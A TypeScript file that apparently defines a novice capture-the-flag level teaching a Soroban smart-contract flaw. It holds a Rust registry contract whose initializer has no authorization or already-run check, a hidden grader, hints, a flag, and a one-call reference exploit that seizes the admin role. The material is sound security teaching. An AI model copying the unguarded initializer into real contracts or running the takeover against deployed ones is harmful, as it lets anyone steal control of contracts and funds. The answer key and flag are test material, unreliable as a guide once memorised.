import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 02 — THE SECOND COMING.
//
// Class: an initializer that can run twice (Stellar Security Portal lists
// dozens: "Token can be re-initialized", "Initialize bond_contract again").
// `initialize` names the admin and never asks whether one already exists or
// who is calling, so the first call after deployment is a race anyone can
// win — and, here, so is every call after it.
//
// The exploit is one client call. The lesson is reading a contract for the
// guard that is NOT there.

const LEVEL_RS = `//! The Registry of Saint Stroop — who holds the keys?
//!
//! Compare how the admin is set with how the admin is changed.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

#[contracttype]
pub enum DataKey {
    Admin,
}

#[contract]
pub struct Registry;

#[contractimpl]
impl Registry {
    /// Name the registry's admin. Meant to run once, right after deployment.
    pub fn initialize(env: Env, admin: Address) {
        env.storage().instance().set(&DataKey::Admin, &admin);
    }

    /// Hand the keys to someone else. Only the current admin may do this.
    pub fn transfer_admin(env: Env, new_admin: Address) {
        let admin: Address = env.storage().instance().get(&DataKey::Admin).unwrap();
        admin.require_auth();
        env.storage().instance().set(&DataKey::Admin, &new_admin);
    }

    /// Public view: who holds the keys right now.
    pub fn admin(env: Env) -> Address {
        env.storage().instance().get(&DataKey::Admin).unwrap()
    }
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The grader deploys a fresh registry and names \`victim\` its admin, then
// calls this function. Make \`attacker\` the admin.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::RegistryClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: the registry's admin is set by one function. Who is allowed to call it?
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The owner initializes the registry with a real authorization, then every
// mock is dropped. The attacker holds no signature at all: if taking the keys
// needed one, the exploit would panic here.
use second_coming::exploit;
use second_coming::level::{Registry, RegistryClient};
use soroban_sdk::testutils::Address as _;
use soroban_sdk::{Address, Env};

#[test]
fn ctf_win() {
    let env = Env::default();
    let registry_id = env.register(Registry, ());
    let client = RegistryClient::new(&env, &registry_id);

    let owner = Address::generate(&env);
    let attacker = Address::generate(&env);

    env.mock_all_auths();
    client.initialize(&owner);
    env.set_auths(&[]);

    assert_eq!(client.admin(), owner, "setup failed");

    exploit::solve(&env, registry_id.clone(), owner.clone(), attacker.clone());

    assert_eq!(
        client.admin(),
        attacker,
        "the owner still holds the keys — the registry held"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::{Address, Env};

use crate::level::RegistryClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = victim;
    let client = RegistryClient::new(env, &vault);
    // initialize() never checks that it has not run before, nor who calls it.
    client.initialize(&attacker);
}
`;

export const secondComing: CtfLevel = {
  slug: "second-coming",
  title: "The Second Coming",
  tagline: "An initializer that anyone can run again, long after the owner moved in.",
  difficulty: "novice",
  estMinutes: 10,
  story: `The Registry of Saint Stroop was deployed, initialized and forgotten. Its owner signed the deed on day one and has not looked at it since.

The Stroopbeholder read the owner's signature a thousand times. Nobody asked whether the deed could be signed twice.`,
  brief: `## The target

\`src/level.rs\` is a tiny registry. \`transfer_admin\` changes the admin and demands the current admin's signature. \`initialize\` is how the first admin gets named.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

The grader deploys a fresh registry, initializes it with \`victim\` as admin, drops every authorization mock, then calls your \`solve\`. Make \`attacker\` the admin.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- \`attacker\` holds no signature. Anything that needs \`require_auth\` will fail.

## Reading the state

\`admin()\` is a public view. Use it to check who holds the keys.`,
  hints: [
    "Read both functions that write `DataKey::Admin`. One of them checks something before it writes. The other does not.",
    "`initialize` has no `require_auth` and no \"already initialized\" check. Nothing stops a second call.",
    "You do not need a signature. Call `initialize` yourself, with `attacker` as the new admin.",
  ],
  files: {
    "Cargo.toml": cargoToml("second_coming"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  // The solution is a client call. Direct storage access has no business here.
  forbid: ["storage"],
  flag: "TUSST{1n1t_c4n_run_tw1c3}",
  reference: REFERENCE_RS,
};
